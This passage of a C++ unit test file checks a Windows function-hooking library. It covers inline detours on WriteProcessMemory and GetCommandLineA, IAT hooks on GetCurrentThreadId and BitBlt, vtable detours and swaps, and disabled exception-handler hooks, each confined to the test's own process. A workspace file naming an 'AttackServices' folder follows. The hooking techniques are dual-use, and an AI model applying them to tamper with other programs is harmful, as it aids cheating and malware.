	REQUIRE(MessageBoxA(NULL, "Message", "Sample", MB_OK) == -10); //The return value set by our handler
	Detour_Ex->UnHook();
	REQUIRE(MessageBoxA(NULL, "Message", "Sample", MB_OK) == IDOK);

	REQUIRE(Detour_Ex->GetLastError().GetSeverity() != PLH::RuntimeError::Severity::UnRecoverable);
	REQUIRE(Detour_Ex->GetLastError().GetSeverity() != PLH::RuntimeError::Severity::Critical);
}

decltype(&WriteProcessMemory) oWriteProcessMemory;
BYTE DummyBuffer2[] = { 0x13,0x24,0x36,0x38 };
BOOL WINAPI hkWriteProcessMemory(HANDLE  hProcess,LPVOID  lpBaseAddress,LPCVOID lpBuffer,SIZE_T  nSize,SIZE_T  *lpNumberOfBytesWritten)
{
	lpBuffer = &DummyBuffer2;
	nSize = sizeof(DummyBuffer2);
	return oWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
}

TEST_CASE("Hooks WriteProcessMemory", "[Detours]")
{
	std::shared_ptr<PLH::Detour> Detour_Ex(new PLH::Detour);
	REQUIRE(Detour_Ex->GetType() == PLH::HookType::Detour);

	Detour_Ex->SetupHook((BYTE*)&WriteProcessMemory, (BYTE*)&hkWriteProcessMemory); //can cast to byte* to
	REQUIRE(Detour_Ex->Hook());
	oWriteProcessMemory = Detour_Ex->GetOriginal<decltype(&WriteProcessMemory)>();

	BYTE Buffer[] = { 0x00,0x12,0x44,0x91 };
	BYTE Buffer2[] = { 0x11,0x21,0x56,0x78};

	REQUIRE(Buffer[0] == 0x00);
	SIZE_T Written = 0;
	WriteProcessMemory(GetCurrentProcess(), &Buffer, &Buffer2, sizeof(Buffer2), &Written);
	REQUIRE(Buffer[0] == 0x13); //Make sure our hook changed the data written to the data in the dummy buffer
	Detour_Ex->UnHook();
	
	Written = 0;
	WriteProcessMemory(GetCurrentProcess(), &Buffer, &Buffer2, sizeof(Buffer2), &Written);
	REQUIRE(Buffer[0] == 0x11);
	
	REQUIRE(Detour_Ex->GetLastError().GetSeverity() != PLH::RuntimeError::Severity::UnRecoverable);
	REQUIRE(Detour_Ex->GetLastError().GetSeverity() != PLH::RuntimeError::Severity::Critical);
}

decltype(&GetCommandLineA) oGetCommandLine;
int CommandLineVerifier = 0;
LPSTR WINAPI hkGetCommandLineA()
{
	CommandLineVerifier = 1294;
	LPSTR ReturnVal = oGetCommandLine();
	return ReturnVal;
}

TEST_CASE("Hooks GetCommandLine", "[Detours]")
{
	std::shared_ptr<PLH::Detour> Detour_Ex(new PLH::Detour);
	REQUIRE(Detour_Ex->GetType() == PLH::HookType::Detour);

	Detour_Ex->SetupHook((BYTE*)&GetCommandLineA, (BYTE*)&hkGetCommandLineA); //can cast to byte* to
	REQUIRE(Detour_Ex->Hook());
	oGetCommandLine = Detour_Ex->GetOriginal<decltype(&GetCommandLineA)>();

	REQUIRE(CommandLineVerifier == 0);
	GetCommandLineA();
	REQUIRE(CommandLineVerifier == 1294);
	Detour_Ex->UnHook();
	REQUIRE(CommandLineVerifier == 1294);

	REQUIRE(Detour_Ex->GetLastError().GetSeverity() != PLH::RuntimeError::Severity::UnRecoverable);
	REQUIRE(Detour_Ex->GetLastError().GetSeverity() != PLH::RuntimeError::Severity::Critical);
}
/////////////////////////////////////////////////////////////////////////////////////////////////

typedef DWORD(__stdcall* tGetCurrentThreadId)();
tGetCurrentThreadId oGetCurrentThreadID;

DWORD __stdcall hkGetCurrentThreadId()
{
	return oGetCurrentThreadID() + 1;
}

typedef BOOL(__stdcall* tBitBlt)(HDC hdcDest, int nXDest, int nYDest, int nWidth, int nHeight,
	HDC hdcSrc, int nXSrc, int nYSrc, DWORD dwRop);
tBitBlt oBitBlt;

//Just an int that gets incremented to verify handler got called for unit tests

int BitBltHookVerifier = 0; 
BOOL __stdcall hkBitBlt(HDC hdcDest, int nXDest, int nYDest, int nWidth, int nHeight,
	HDC hdcSrc, int nXSrc, int nYSrc, DWORD dwRop)
{
	BitBltHookVerifier += 1337;
	return oBitBlt(hdcDest, nXDest, nYDest, nWidth, nHeight, hdcSrc, nXSrc, nYSrc, dwRop);
}

TEST_CASE("Hooks Using IAT", "[IATHOOK]")
{
	std::shared_ptr<PLH::IATHook> IATHook_Ex(new PLH::IATHook);
	DWORD RealThreadId = GetCurrentThreadId();

	REQUIRE(IATHook_Ex->GetType() == PLH::HookType::IAT);

	SECTION("GetCurrentThread Hook")
	{
		IATHook_Ex->SetupHook("kernel32.dll", "GetCurrentThreadId", (BYTE*)&hkGetCurrentThreadId);
		REQUIRE(IATHook_Ex->Hook());
		oGetCurrentThreadID = IATHook_Ex->GetOriginal<tGetCurrentThreadId>();
		REQUIRE(GetCurrentThreadId() == RealThreadId + 1);
		IATHook_Ex->UnHook();
		REQUIRE(GetCurrentThreadId() == RealThreadId);

		REQUIRE(IATHook_Ex->GetLastError().GetSeverity() != PLH::RuntimeError::Severity::UnRecoverable);
		REQUIRE(IATHook_Ex->GetLastError().GetSeverity() != PLH::RuntimeError::Severity::Critical);
	}
	SECTION("BitBlt Hook")
	{
		REQUIRE(BitBltHookVerifier == 0);
		IATHook_Ex->SetupHook("Gdi32.dll", "BitBlt", (BYTE*)&hkBitBlt);
		REQUIRE(IATHook_Ex->Hook());
		oBitBlt = IATHook_Ex->GetOriginal<tBitBlt>();
		BitBlt(NULL, 0, 0, 0, 0, NULL, 0, 0, 0);
		REQUIRE(BitBltHookVerifier == 1337);
		IATHook_Ex->UnHook();
		BitBlt(NULL, 0, 0, 0, 0, NULL, 0, 0, 0);
		REQUIRE(BitBltHookVerifier == 1337);

		REQUIRE(IATHook_Ex->GetLastError().GetSeverity() != PLH::RuntimeError::Severity::UnRecoverable);
		REQUIRE(IATHook_Ex->GetLastError().GetSeverity() != PLH::RuntimeError::Severity::Critical);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////

class VirtualTest
{
public:
	virtual int NoParamVirt()
	{
		return 4;
	}
	virtual int NoParamVirt2()
	{
		return 7;
	}
};

typedef int(__thiscall* tVirtNoParams)(DWORD_PTR pThis);
tVirtNoParams oVirtNoParams;
tVirtNoParams oVirtNoParams2;

int __fastcall hkVirtNoParams(DWORD_PTR pThis)
{
	return oVirtNoParams(pThis) + 1;
}

TEST_CASE("Detours a function pointed to in a virtual table", "[VFuncDetour]")
{
	std::shared_ptr<VirtualTest> ClassToHook(new VirtualTest);
	std::shared_ptr<PLH::VFuncDetour> VFuncDetour_Ex(new PLH::VFuncDetour);

	int OriginalRetVal = ClassToHook->NoParamVirt();
	REQUIRE(VFuncDetour_Ex->GetType() == PLH::HookType::VFuncDetour);

	VFuncDetour_Ex->SetupHook(*(BYTE***)ClassToHook.get(), 0, (BYTE*)&hkVirtNoParams);
	REQUIRE(VFuncDetour_Ex->Hook());
	oVirtNoParams = VFuncDetour_Ex->GetOriginal<tVirtNoParams>();
	REQUIRE(ClassToHook->NoParamVirt() == OriginalRetVal + 1);
	VFuncDetour_Ex->UnHook();
	REQUIRE(ClassToHook->NoParamVirt() == OriginalRetVal);

	REQUIRE(VFuncDetour_Ex->GetLastError().GetSeverity() != PLH::RuntimeError::Severity::UnRecoverable);
	REQUIRE(VFuncDetour_Ex->GetLastError().GetSeverity() != PLH::RuntimeError::Severity::Critical);
}

////////////////////////////////////////////////////////////////////////////////////////////////

int __fastcall hkVirtNoParams2(DWORD_PTR pThis)
{
	return oVirtNoParams2(pThis) + 1;
}

TEST_CASE("Replaces the vtable pointer to hook a function", "[VTableSwap]")
{
	std::shared_ptr<VirtualTest> ClassToHook(new VirtualTest);
	std::shared_ptr<PLH::VTableSwap> VTableSwap_Ex(new PLH::VTableSwap);

	REQUIRE(VTableSwap_Ex->GetType() == PLH::HookType::VTableSwap);
	int OriginalRetVal = ClassToHook->NoParamVirt();
	int OriginalRetVal2 = ClassToHook->NoParamVirt2();

	VTableSwap_Ex->SetupHook((BYTE*)ClassToHook.get(), 0, (BYTE*)&hkVirtNoParams);
	REQUIRE(VTableSwap_Ex->Hook());
	oVirtNoParams = VTableSwap_Ex->GetOriginal<tVirtNoParams>();

	REQUIRE(ClassToHook->NoParamVirt() == OriginalRetVal + 1);
	oVirtNoParams2 = VTableSwap_Ex->HookAdditional<tVirtNoParams>(1, (BYTE*)&hkVirtNoParams2);
	REQUIRE(ClassToHook->NoParamVirt2() == OriginalRetVal2 + 1);

	VTableSwap_Ex->UnHook();
	REQUIRE(ClassToHook->NoParamVirt() == OriginalRetVal);
	REQUIRE(ClassToHook->NoParamVirt2() == OriginalRetVal2);


	REQUIRE(VTableSwap_Ex->GetLastError().GetSeverity() != PLH::RuntimeError::Severity::UnRecoverable);
	REQUIRE(VTableSwap_Ex->GetLastError().GetSeverity() != PLH::RuntimeError::Severity::Critical);
}

////////////////////////////////////////////////////////////////////////////////////////////////
typedef int(__stdcall* tVEH)(int intparam);
tVEH oVEHTest;
__declspec(noinline) int __stdcall VEHTest(int param)
{
	return 3;
}

std::shared_ptr<PLH::VEHHook> VEHHook_Ex;
__declspec(noinline) int __stdcall hkVEHTest(int param)
{
	auto ProtectionObject = VEHHook_Ex->GetProtectionObject();
	return oVEHTest(param) + 1;
}

TEST_CASE("Hooks a function using vectored exception handler", "[VEHHook]")
{
	////THESE TESTS CANNOT BE RUN IN A DEBUGGER
	//VEHHook_Ex = std::make_shared<PLH::VEHHook>();

	//REQUIRE(VEHHook_Ex->GetType() == PLH::HookType::VEH);
	//int OriginalRetVal = VEHTest(1);

	//SECTION("INT3 Type Breakpoint")
	//{
	//	VEHHook_Ex->SetupHook((BYTE*)&VEHTest, (BYTE*)&hkVEHTest, PLH::VEHHook::VEHMethod::INT3_BP);
	//	REQUIRE(VEHHook_Ex->Hook());
	//	oVEHTest = VEHHook_Ex->GetOriginal<tVEH>();
	//	REQUIRE(VEHTest(3) == OriginalRetVal + 1);
	//	VEHHook_Ex->UnHook();
	//	REQUIRE(VEHTest(3) == OriginalRetVal);
	//}
	//SECTION("Hardware Type Breakpoint")
	//{
	//	VEHHook_Ex->SetupHook((BYTE*)&VEHTest, (BYTE*)&hkVEHTest, PLH::VEHHook::VEHMethod::HARDWARE_BP);
	//	REQUIRE(VEHHook_Ex->Hook());
	//	oVEHTest = VEHHook_Ex->GetOriginal<tVEH>();
	//	REQUIRE(VEHTest(3) == OriginalRetVal + 1);
	//	VEHHook_Ex->UnHook();
	//	REQUIRE(VEHTest(3) == OriginalRetVal);
	//}
	//SECTION("Guard Page Type Hook")
	//{
	//	INFO("This Type may fail, due to the small demo size");
	//	/*!!!!IMPORTANT!!!!!: Since this demo is small it's possible for internal methods to be on the same memory page
	//	as the VEHTest function. If that happens the GUARD_PAGE type method will fail with an unexpected exception.
	//	If this method is used in larger applications this risk is incredibly small, to the point where it should not
	//	be worried about. You CANNOT run this demo under a debugger when using VEH type
	//	*/

	//	VEHHook_Ex->SetupHook((BYTE*)&VEHTest, (BYTE*)&hkVEHTest, PLH::VEHHook::VEHMethod::GUARD_PAGE);
	//	REQUIRE(VEHHook_Ex->Hook());
	//	oVEHTest = VEHHook_Ex->GetOriginal<tVEH>();
	//	REQUIRE(VEHTest(3) == OriginalRetVal + 1);
	//	VEHHook_Ex->UnHook();
	//	REQUIRE(VEHTest(3) == OriginalRetVal);
	//}
}


```

`workspace.code-workspace`:

```code-workspace
{
	"folders": [
		{
			"path": "AttackServices"
		}
	]
}
```